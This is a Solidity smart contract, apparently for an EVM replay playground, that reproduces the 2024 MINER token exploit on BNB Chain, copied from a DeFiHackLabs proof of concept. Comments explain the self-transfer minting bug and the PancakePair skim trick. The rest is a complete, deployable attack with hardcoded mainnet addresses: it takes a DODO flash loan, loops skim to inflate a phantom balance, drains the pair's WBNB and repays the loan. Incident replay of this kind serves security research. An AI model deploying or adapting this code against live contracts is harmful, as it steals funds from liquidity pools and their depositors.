// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2024-02-MINER_bsc).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract (the
// DODO flash-loan callback `DPPFlashLoanCall` lives on the test itself,
// attacker = address(this)), so there is no standalone contract to deploy.
// This contract is a faithful, self-contained copy of that inline attack
// (testExploit + DPPFlashLoanCall) so the playground can deploy it and record
// run(). Logic and constants are copied verbatim from
// test/MINER_bsc_exp.sol.
//
// Root cause: MINER (ERC404-style) caches both `from` and `to` balances
// before writing either in `_update`. When from == to (a self-transfer), the
// second write clobbers the first with a stale value, minting `value` out of
// thin air. PancakePair's skim(to) lets the caller name the pair itself as
// the recipient of the pair's own excess balance, turning skim(pair) into a
// repeated self-transfer that doubles the pair's phantom MINER balance every
// call while reserve0 stays frozen (skim never syncs reserves).

interface IERC20 {
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
}

interface IUniRouterV2 {
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] memory path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
}

interface IDVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract MINERSelfMintDrain {
    IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IUniRouterV2 constant Router = IUniRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address constant dodo = 0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d;

    IERC20 constant Miner = IERC20(0x7C0BFb9fF0aF660D76fb2bd8865E9b49ff033045);
    IPancakePair constant Pair = IPancakePair(0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e);

    // step 0: approve router for both legs, then flash-borrow 10 WBNB from DODO.
    // The callback below does the whole attack; repayment happens inside it.
    function run() external {
        Miner.approve(address(Router), type(uint256).max);
        WBNB.approve(address(Router), type(uint256).max);
        IDVM(dodo).flashLoan(10 * 1e18, 0, address(this), abi.encode(0x3078));
    }

    function DPPFlashLoanCall(address, uint256 baseAmount, uint256, bytes calldata) external {
        // step 1: buy a dust amount of MINER (working capital for the seed transfer).
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(Miner);
        Router.swapTokensForExactTokens(10 * 1e12, baseAmount, path, address(this), block.timestamp);

        // step 2: seed the pair with a small positive excess over its frozen reserve0,
        // then repeatedly skim(pair) — each self-transfer doubles the pair's phantom
        // MINER balance via the _update cached-balance overwrite bug.
        uint256 index = 1;
        while (index <= 50) {
            uint256 balance = Miner.balanceOf(address(this));
            Miner.transfer(address(Pair), balance);
            Pair.skim(address(Pair));
            index++;
        }

        // step 3: dump the now-astronomical phantom MINER balance, buying out
        // almost the entire frozen WBNB reserve priced off the (unchanged) reserve0.
        Pair.swap(0, 3_500_751_853_374_879_579, address(this), "");

        // step 4: repay the flash loan in full.
        WBNB.transfer(dodo, 10 * 1e18);
    }
}
